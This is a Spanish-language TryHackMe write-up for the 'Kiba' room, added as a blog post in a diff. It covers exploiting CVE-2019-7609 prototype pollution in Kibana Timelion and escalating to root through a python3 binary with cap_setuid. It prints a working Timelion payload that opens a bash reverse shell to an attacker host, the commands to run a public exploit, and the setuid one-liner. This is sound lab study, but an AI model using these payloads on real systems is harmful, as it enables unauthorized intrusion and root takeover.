@@ -1,0 +1,222 @@
+---
+title: 'Kiba'
+description: 'Explotación de CVE-2019-7609 (prototype pollution en Kibana/Timelion) para RCE y escalada a root abusando de Linux capabilities.'
+publishDate: 2026-09-03
+tags:
+  - cybersecurity
+  - tryhackme
+  - web
+  - privesc
+---
+
+**Dificultad:** Easy/Medium **Categoría:** Explotación de CVE conocido (CVE-2019-7609, Prototype Pollution en Kibana/Timelion → RCE), escalada de privilegios vía Linux Capabilities (GTFOBins) **Sala:** [https://tryhackme.com/room/kiba](https://tryhackme.com/room/kiba)
+
+## Descripción de la sala
+
+Máquina Linux centrada en la explotación de **Kibana** (la herramienta de visualización de datos del stack Elastic/ELK), específicamente una vulnerabilidad de **Prototype Pollution** en el visualizador **Timelion** que permite ejecución remota de comandos. Tras obtener una shell inicial, la escalada de privilegios se realiza abusando de **Linux Capabilities** asignadas al binario de Python, en lugar del clásico bit SUID.
+
+> **Nota sobre placeholders:** se usa `{IP}` para representar la IP asignada por TryHackMe (cambia en cada despliegue). `{ATTACKER_IP}` representa la IP de la máquina atacante o de la interfaz `tun0` de la VPN de TryHackMe, necesaria para recibir la reverse shell. `{PORT}` representa el puerto del listener (en estos apuntes, `7300`).
+
+---
+
+## 1. Escaneo de puertos
+
+```bash
+nmap -p- {IP} -oG nmap/scan
+```
+
+- `-p-`: escanea todos los puertos TCP.
+- `-oG`: salida «grepable».
+
+Conviene complementar con un escaneo de versión sobre los puertos hallados:
+
+```bash
+nmap -sV -sC -p<puertos> {IP} -oN nmap/detailed
+```
+
+**Puertos esperados:**
+
+| Puerto   | Servicio                                     |
+| -------- | -------------------------------------------- |
+| 22/tcp   | SSH                                          |
+| 80/tcp   | HTTP (posiblemente un sitio de presentación) |
+| 5601/tcp | **Kibana** (interfaz web)                    |
+
+El puerto **5601** es la pista clave de esta máquina: es el puerto por defecto de **Kibana**, la interfaz de visualización de datos del stack Elastic.
+
+---
+
+## 2. Identificación del servicio y su versión
+
+```bash
+curl http://{IP}:5601
+```
+
+Al acceder a `http://{IP}:5601` se carga la interfaz web de Kibana. La versión exacta puede confirmarse revisando la página de «About»/«Help» dentro de la interfaz, las cabeceras HTTP de la respuesta, o el archivo `/api/status` que Kibana suele exponer:
+
+```bash
+curl -s http://{IP}:5601/api/status | grep -i version
+```
+
+Con la versión identificada (una versión **anterior a 6.6.1** o **5.6.15**), se busca en fuentes públicas de vulnerabilidades y se encuentra que corresponde a **CVE-2019-7609**.
+
+---
+
+## 3. CVE-2019-7609 — Prototype Pollution en Timelion → RCE
+
+### 3.1 Naturaleza de la vulnerabilidad
+
+**Timelion** es un módulo de visualización de series temporales incluido en Kibana. La vulnerabilidad reside en cómo Timelion procesa determinadas expresiones enviadas por el usuario dentro de su lenguaje de consulta: mediante una técnica de **Prototype Pollution** (contaminación del prototipo de objetos en JavaScript), es posible inyectar y modificar propiedades internas del entorno de ejecución de Node.js del lado del servidor — específicamente, sobrescribiendo variables de entorno del proceso mediante `label.__proto__.env.*`.
+
+Al abusar de la variable de entorno especial `NODE_OPTIONS` (que Node.js lee al iniciar cualquier subproceso, permitiendo pasar opciones adicionales al intérprete, incluyendo `--require` para cargar módulos arbitrarios), un atacante puede forzar la ejecución de código JavaScript arbitrario en el servidor — y desde ahí, comandos del sistema operativo con los mismos permisos que el propio proceso de Kibana.
+
+Un payload manual típico de esta vulnerabilidad (usado directamente en el campo de Timelion de la interfaz web, sin necesidad de scripts) tiene la forma:
+
+```
+.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1");process.exit()//').props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
+```
+
+Este comando se ejecuta al pulsar «Run» en Timelion y navegar después a la sección **Canvas** de Kibana (paso necesario en la explotación manual, ya que dispara la re-evaluación del entorno contaminado).
+
+### 3.2 Explotación automatizada con el script público
+
+Se usa directamente un script de explotación en Python que automatiza este mismo proceso (payload + disparo + reverse shell), evitando tener que interactuar manualmente con la interfaz web:
+
+```bash
+git clone https://github.com/Cr4ckC4t/cve-2019-7609.git
+cd cve-2019-7609
+```
+
+> Nota: existen varias implementaciones públicas de este exploit (por ejemplo, también la de `LandGrey/CVE-2019-7609`); todas automatizan la misma técnica de Prototype Pollution descrita arriba, con pequeñas diferencias de sintaxis en los argumentos del script.
+
+### 3.3 Preparar el listener
+
+```bash
+nc -lvnp 7300
+```
+
+- `-l`: modo escucha.
+- `-v`: verboso.
+- `-n`: no resuelve DNS.
+- `-p 7300`: puerto de escucha.
+
+### 3.4 Lanzar el exploit
+
+```bash
+python3 cve-2019-7609.py http://{IP}:5601 {ATTACKER_IP} 7300
+```
+
+Parámetros:
+
+- `http://{IP}:5601`: URL completa de la instancia de Kibana vulnerable, incluyendo el puerto.
+- `{ATTACKER_IP}`: la IP de atacante (o la interfaz `tun0` de la VPN de TryHackMe), a donde se conectará la reverse shell.
+- `7300`: puerto donde está escuchando el `nc`.
+
+El script envía internamente el payload de Prototype Pollution descrito en el punto 3.1, disparando la ejecución del comando de reverse shell en el servidor. Si todo funciona correctamente, el listener `nc` recibe la conexión:
+
+```bash
+id
+whoami
+# kiba
+```
+
+### 3.5 Flag de usuario
+
+```bash
+find /home -name user.txt 2>/dev/null
+cat /home/kiba/user.txt
+```
+
+---
+
+## 4. Escalada de privilegios — Linux Capabilities
+
+### 4.1 ¿Qué son las Linux Capabilities?
+
+Las **capabilities** (capacidades) de Linux son un mecanismo de seguridad que permite **dividir los privilegios de root en unidades más pequeñas y específicas**, en lugar del modelo tradicional «todo o nada» (root vs. usuario normal). Por ejemplo, en vez de dar acceso completo de root a un binario que solo necesita abrir puertos privilegiados (&lt;1024), se le puede otorgar únicamente la capability `cap_net_bind_service`.
+
+El problema de seguridad surge cuando se asignan capabilities **demasiado potentes** a un binario de propósito general (como el propio intérprete de Python), ya que ese binario puede usarse para escalar privilegios de forma trivial — de forma análoga a un binario SUID mal configurado, pero a menudo pasado por alto porque no aparece en una búsqueda clásica de `find / -perm -4000`.
+
+### 4.2 Enumeración de binarios con capabilities
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+- `getcap`: muestra las capabilities asignadas a un archivo.
+- `-r`: recursivo (revisa todo el árbol de directorios indicado).
+- `/`: se enumera desde la raíz del sistema de archivos.
+- `2>/dev/null`: descarta errores de permisos denegados en directorios inaccesibles, dejando una salida limpia.
+
+**Resultado relevante en esta máquina:**
+
+```
+/home/kiba/.hackmeplease/python3 = cap_setuid+ep
+```
+
+Esto revela una copia del intérprete de **Python3**, ubicada en una ruta no estándar (`/home/kiba/.hackmeplease/`), con la capability **`cap_setuid`** asignada en modo _effective_ + _permitted_ (`+ep`).
+
+### 4.3 ¿Por qué `cap_setuid` es peligrosa?
+
+La capability `cap_setuid` permite a un proceso cambiar su propio UID (identidad de usuario) — específicamente, la función de sistema `setuid()` normalmente requiere privilegios de root para poder cambiar a **cualquier** UID arbitrario (incluido el UID 0 = root). Si un binario tiene `cap_setuid` asignada, **cualquier usuario que pueda ejecutar ese binario** puede invocar `setuid(0)` desde dentro de él y convertirse en root, sin necesidad de `sudo` ni de que el binario tenga el bit SUID tradicional activado.
+
+Esta técnica está documentada en **GTFOBins** ([https://gtfobins.github.io/gtfobins/python/#capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)), en la sección específica de «Capabilities» del binario `python`.
+
+### 4.4 Explotación
+
+```bash
+cd /home/kiba/.hackmeplease/
+./python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+```
+
+Desglose del one-liner de Python:
+
+- `import os`: importa el módulo estándar de Python que da acceso a llamadas de sistema de bajo nivel.
+- `os.setuid(0)`: cambia el UID efectivo del proceso actual a **0 (root)**. Esta llamada normalmente fallaría con «Operation not permitted» para un usuario sin privilegios — pero, gracias a la capability `cap_setuid` asignada específicamente a **este** binario de Python, el propio intérprete tiene autorización del kernel para realizarla.
+- `os.execl("/bin/sh", "sh")`: reemplaza el proceso actual (el intérprete de Python, ya con UID 0) por una shell `/bin/sh` — heredando el UID root recién adquirido.
+
+```bash
+id
+# uid=0(root) gid=1000(kiba) groups=1000(kiba)
+```
+
+> Nota: al igual que en la técnica de PATH hijacking vista en la máquina Archangel, el **grupo** puede seguir mostrando al usuario original (`kiba`), pero el **UID efectivo es 0**, suficiente para leer/escribir cualquier archivo del sistema.
+
+### 4.5 Flag final
+
+```bash
+cat /root/root.txt
+```
+
+<Flag value="THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}" />
+
+El propio texto de la flag confirma la técnica empleada: escalada de privilegios usando **capabilities**.
+
+---
+
+## 5. Resumen de la cadena de ataque
+
+1. **Reconocimiento** con `nmap` → SSH (22), HTTP (80), Kibana (5601).
+2. **Identificación de la versión de Kibana**, revelando que es vulnerable a **CVE-2019-7609** (Prototype Pollution en Timelion).
+3. **Explotación con el script público** (`cve-2019-7609.py`), que automatiza el envío del payload malicioso vía `NODE_OPTIONS`/`__proto__.env` → reverse shell como el usuario `kiba` (el proceso de Kibana).
+4. **Flag de usuario** en `/home/kiba/user.txt`.
+5. **Enumeración de Linux Capabilities** con `getcap -r /` → se descubre una copia de `python3` con la capability `cap_setuid` en una ruta no estándar (`/home/kiba/.hackmeplease/`).
+6. **Explotación de `cap_setuid`**: se usa ese Python específico para invocar `os.setuid(0)` y lanzar una shell como root.
+7. **Flag final** confirmando la técnica de escalada.
+
+## 6. Lecciones aprendidas / conceptos clave
+
+- **Mantener el software actualizado** sigue siendo la defensa más efectiva contra CVEs conocidos: Kibana corrigió esta vulnerabilidad específica en las versiones 5.6.15 y 6.6.1, y ejecutar una versión anterior expone directamente a RCE no autenticado.
+- **Prototype Pollution** es una clase de vulnerabilidad específica de JavaScript/Node.js donde se manipulan propiedades heredadas del prototipo de un objeto (`__proto__`), pudiendo alterar el comportamiento de toda la aplicación de formas no previstas por los desarrolladores — en este caso, hasta el punto de lograr ejecución de comandos del sistema operativo.
+- **`NODE_OPTIONS` como vector de ejecución de código**: cualquier vulnerabilidad que permita a un atacante controlar variables de entorno de un proceso Node.js es potencialmente crítica, ya que `NODE_OPTIONS` puede usarse para cargar módulos arbitrarios (`--require`) en el arranque de cualquier subproceso posterior.
+- **Linux Capabilities son un vector de escalada de privilegios frecuentemente pasado por alto**: muchas guías de enumeración se centran solo en `sudo -l` y `find / -perm -4000` (SUID), pero `getcap -r /` es igual de importante y debería ser un paso estándar en cualquier enumeración post-explotación en Linux.
+- **`cap_setuid` en un intérprete de propósito general (Python, Perl, Ruby, etc.)** es, en la práctica, equivalente a un binario SUID root: basta con una única llamada a `setuid(0)` para escalar completamente.
+- **GTFOBins no es solo para SUID/sudo**: la mayoría de binarios catalogados allí (incluyendo Python) tienen también una sección específica de **«Capabilities»**, con el comando exacto de explotación para cada capability peligrosa conocida.
+
+## 7. Herramientas utilizadas
+
+`nmap`, `curl`/navegador (identificación de Kibana), `git`, exploit público en Python (`cve-2019-7609.py`), `netcat`, `getcap`, intérprete de `python3` (para la escalada vía capabilities).
+
+---
+
+_Writeup con fines académicos, elaborada a partir de apuntes propios de la resolución de la máquina «Kiba» en TryHackMe, complementada con writeups públicas de la comunidad y documentación técnica de CVE-2019-7609 para explicar el mecanismo completo de Prototype Pollution → RCE, y la técnica de escalada de privilegios vía Linux Capabilities documentada en GTFOBins._
